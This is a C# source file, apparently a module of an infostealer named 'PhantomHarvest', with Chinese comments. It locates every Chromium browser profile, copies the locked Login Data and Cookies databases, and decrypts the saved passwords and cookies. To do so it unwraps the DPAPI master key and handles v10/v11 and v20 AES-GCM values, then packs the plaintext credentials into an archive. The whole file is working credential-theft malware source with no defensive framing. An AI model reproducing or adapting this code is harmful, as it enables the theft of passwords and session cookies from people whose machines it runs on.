using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Browsers
{
	internal class BrowserHost
	{
		public static void Collect(ArchiveManager zip)
		{
			// 使用PathDiscovery获取所有浏览器路径（支持多盘符）
			Dictionary<string, List<string>> allBrowserPaths = PathDiscovery.GetAllChromiumPaths();
			
			foreach (var browserEntry in allBrowserPaths)
			{
				string browserName = browserEntry.Key;
				List<string> userDataPaths = browserEntry.Value;
				
				// 遍历该浏览器的所有User Data路径（可能安装在多个位置）
				for (int pathIndex = 0; pathIndex < userDataPaths.Count; pathIndex++)
				{
					try
					{
						string userDataPath = userDataPaths[pathIndex];
						if (!Directory.Exists(userDataPath))
							continue;
						
						// 浏览器名称后缀（如果有多个安装）
						string browserSuffix = userDataPaths.Count > 1 ? "_" + pathIndex : "";
						
						string localStatePath = Path.Combine(userDataPath, "Local State");
						byte[] masterKeyV10 = null;
						byte[] masterKeyV20 = null;
						
						if (File.Exists(localStatePath))
						{
							// 尝试获取v10 master key（旧方法）
							masterKeyV10 = BrowserHost.GetMasterKey(localStatePath);
							
							// 尝试获取v20 master key（新方法，Chrome 127+）
							masterKeyV20 = ChromeV20Decryptor.GetV20MasterKey(localStatePath);
						}
						
						// 遍历配置文件（Default, Profile 1 等）
						List<string> profiles = new List<string>();
						if (File.Exists(Path.Combine(userDataPath, "Default", "Preferences"))) 
							profiles.Add(Path.Combine(userDataPath, "Default"));
						
						try
						{
							foreach (string dir in Directory.GetDirectories(userDataPath, "Profile *"))
							{
								profiles.Add(dir);
							}
						}
						catch { }
						
						if (profiles.Count == 0) 
							profiles.Add(userDataPath); // 回退到根目录

						foreach (string profilePath in profiles)
						{
							try
							{
								string profileName = new DirectoryInfo(profilePath).Name;
								string browserPrefix = browserName + browserSuffix + "/" + profileName;
								
								// Console.WriteLine("[DEBUG] 正在处理 Profile: " + profileName);

								// 收集密码（Login Data）
								try
								{
									CollectPasswords(zip, profilePath, browserPrefix, masterKeyV10, masterKeyV20);
								}
								catch { }

								// 收集Cookie
								try
								{
									CollectCookies(zip, profilePath, browserPrefix, masterKeyV10, masterKeyV20);
								}
								catch { }
							}
							catch { }
						}
					}
					catch { }
				}
			}
		}

		private static void CollectPasswords(ArchiveManager zip, string profilePath, string browserPrefix, byte[] masterKeyV10, byte[] masterKeyV20)
		{
			string loginDataPath = Path.Combine(profilePath, "Login Data");
			if (!File.Exists(loginDataPath))
				return;

			byte[] dbBytes = LockedFile.ReadLockedFile(loginDataPath);
			if (dbBytes == null)
				return;

			DataParser sqliteHandler = new DataParser(dbBytes);
			
			// 检查 WAL 文件
			string walPath = loginDataPath + "-wal";
			if (File.Exists(walPath))
			{
				byte[] walBytes = LockedFile.ReadLockedFile(walPath);
				if (walBytes != null) 
					sqliteHandler.ApplyWal(walBytes);
			}

			if (!sqliteHandler.ReadTable("logins"))
				return;

			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < sqliteHandler.GetRowCount(); i++)
			{
				string url = sqliteHandler.GetValue(i, "origin_url");
				string username = sqliteHandler.GetValue(i, "username_value");
				string encPass = sqliteHandler.GetValue(i, "password_value");
				string password = "";
				
				if (!string.IsNullOrEmpty(encPass))
				{
					// DataParser 将 BLOB 数据转换为 Base64 字符串，必须使用 FromBase64String 还原
					byte[] encrypted;
					try 
					{
						encrypted = Convert.FromBase64String(encPass);
					}
					catch
					{
						// 兼容性回退：如果不是Base64（极少见），尝试Default
						encrypted = Encoding.Default.GetBytes(encPass);
					}
					
					password = BrowserHost.DecryptData(encrypted, masterKeyV10, masterKeyV20, false);
				}
				
				sb.AppendLine("URL: " + url);
				sb.AppendLine("User: " + username);
				sb.AppendLine("Pass: " + password);
				sb.AppendLine();
			}
			
			if (sb.Length > 0)
			{
				using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(sb.ToString())))
				{
					zip.AddStream(ArchiveManager.Compression.Deflate, browserPrefix + "/Passwords.txt", ms, DateTime.Now, "");
				}
			}
		}

		private static void CollectCookies(ArchiveManager zip, string profilePath, string browserPrefix, byte[] masterKeyV10, byte[] masterKeyV20)
		{
			string cookiesPath = Path.Combine(profilePath, "Network", "Cookies");
			if (!File.Exists(cookiesPath)) 
				cookiesPath = Path.Combine(profilePath, "Cookies");
			
			if (!File.Exists(cookiesPath))
				return;

			byte[] dbBytes = LockedFile.ReadLockedFile(cookiesPath);
			if (dbBytes == null)
				return;

			DataParser sqliteHandler = new DataParser(dbBytes);
			
			// 检查 WAL 文件
			string walPath = cookiesPath + "-wal";
			if (File.Exists(walPath))
			{
				byte[] walBytes = LockedFile.ReadLockedFile(walPath);
				if (walBytes != null) 
					sqliteHandler.ApplyWal(walBytes);
			}

			if (!sqliteHandler.ReadTable("cookies"))
				return;

			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < sqliteHandler.GetRowCount(); i++)
			{
				string host = sqliteHandler.GetValue(i, "host_key");
				string name = sqliteHandler.GetValue(i, "name");
				string encValue = sqliteHandler.GetValue(i, "encrypted_value");
				string val = "";
				
				if (!string.IsNullOrEmpty(encValue))
				{
					// DataParser 将 BLOB 数据转换为 Base64 字符串，必须使用 FromBase64String 还原
					byte[] encrypted;
					try
					{
						encrypted = Convert.FromBase64String(encValue);
					}
					catch
					{
						encrypted = Encoding.Default.GetBytes(encValue);
					}
					
					val = BrowserHost.DecryptData(encrypted, masterKeyV10, masterKeyV20, true);
				}
				
				sb.AppendLine(host + "\tTRUE\t/\tFALSE\t0\t" + name + "\t" + val);
			}
			
			if (sb.Length > 0)
			{
				using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(sb.ToString())))
				{
					zip.AddStream(ArchiveManager.Compression.Deflate, browserPrefix + "/Cookies.txt", ms, DateTime.Now, "");
				}
			}
		}

		private static byte[] GetMasterKey(string localStatePath)
		{
			try
			{
				string content = File.ReadAllText(localStatePath);
				
				// 提取 encrypted_key (v10格式)
				foreach (object obj in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(content))
				{
					Match match = (Match)obj;
					if (match.Success)
					{
						byte[] key = Convert.FromBase64String(match.Groups[1].Value);
						
						// 验证DPAPI前缀(5字节)
						if (key.Length > 5)
						{
							byte[] keyWithoutPrefix = new byte[key.Length - 5];
							Array.Copy(key, 5, keyWithoutPrefix, 0, key.Length - 5);
							return ProtectedData.Unprotect(keyWithoutPrefix, null, DataProtectionScope.CurrentUser);
						}
					}
				}
			}
			catch { }
			return null;
		}

		private static string DecryptData(byte[] buffer, byte[] masterKeyV10, byte[] masterKeyV20, bool isCookie = false)
		{
			try
			{
				string str = Encoding.Default.GetString(buffer);
				
				// 检查v20前缀
				if (str.StartsWith("v20"))
				{
					// 使用v20解密
					if (masterKeyV20 != null)
					{
						string result = ChromeV20Decryptor.DecryptV20Value(buffer, masterKeyV20, isCookie);
						if (result != null) 
							return result;
					}
					// 如果v20解密失败，尝试回退到v10
				}
				
				// 检查v10/v11前缀
				if (str.StartsWith("v10") || str.StartsWith("v11"))
				{
					if (masterKeyV10 == null) 
						return "No Master Key";
					
					byte[] nonce = new byte[12];
					Array.Copy(buffer, 3, nonce, 0, 12);
					byte[] ciphertext = new byte[buffer.Length - 15];
					Array.Copy(buffer, 15, ciphertext, 0, buffer.Length - 15);
					byte[] tag = new byte[16];
					Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16);
					byte[] data = new byte[ciphertext.Length - tag.Length];
					Array.Copy(ciphertext, 0, data, 0, ciphertext.Length - tag.Length);
					return Encoding.UTF8.GetString(new AesGcm().Decrypt(masterKeyV10, nonce, null, data, tag));
				}
				else
				{
					// 老式DPAPI加密
					return Encoding.UTF8.GetString(ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser));
				}
			}
			catch { return "Decrypt Failed"; }
		}

		// 保留旧的BrowserPaths字典作为兼容性备份（已不再使用）
		[Obsolete("Use PathDiscovery.GetAllChromiumPaths() instead")]
		public static Dictionary<string, string> BrowserPaths = new Dictionary<string, string>
		{
			{
				"Chrome",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data")
			},
			{
				"Edge",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data")
			},
			{
				"Brave",
				Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BraveSoftware\\Brave-Browser\\User Data")
			}
		};
	}
}
